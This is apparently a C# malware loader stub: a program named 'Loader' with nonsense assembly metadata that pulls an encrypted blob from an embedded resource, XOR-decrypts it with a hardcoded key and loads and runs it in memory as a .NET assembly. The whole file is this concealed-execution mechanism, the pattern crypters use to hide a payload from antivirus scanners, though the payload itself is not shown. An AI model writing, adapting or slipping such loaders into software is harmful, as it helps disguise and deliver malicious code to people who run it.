using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
[assembly: AssemblyTitle("dreamlandproject")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("record")]
[assembly: AssemblyProduct("ceremony")]
[assembly: AssemblyCopyright("frontier © aerial")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: Guid("18434365-0d19-411b-9be0-2f65ff0dc84d")][assembly: AssemblyVersion("8.13.48.26")][assembly: AssemblyFileVersion("8.13.48.26")]

namespace Loader
{
  
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            byte[] dll = (byte[])GetResource("degrader.resources", "border.dat");

            byte[] key = Convert.FromBase64String("pd+29gYZWJMM5IdpO14X/5dvnKU=");

            for(int i = 0; i < dll.Length; i++)
            {
                dll[i] = (byte)(dll[i] ^ key[i % key.Length]);
            }

            Activator.CreateInstance(Assembly.Load(dll).GetExportedTypes()[0],typeof(Program));
            //Assembly.Load()
        }

        private static object GetResource(string name, string key)
        {
            Assembly asm = Assembly.GetExecutingAssembly();

            using (Stream s = asm.GetManifestResourceStream(name))
            {
                using (ResourceReader rr = new ResourceReader(s))
                {
                    IDictionaryEnumerator en = rr.GetEnumerator();

                    while (en.MoveNext())
                    {
                        if (en.Key is string && (string)en.Key == key)
                        {
                            return en.Value;
                        }
                    }

                }
            }
            throw new Exception();
        }

    }
}
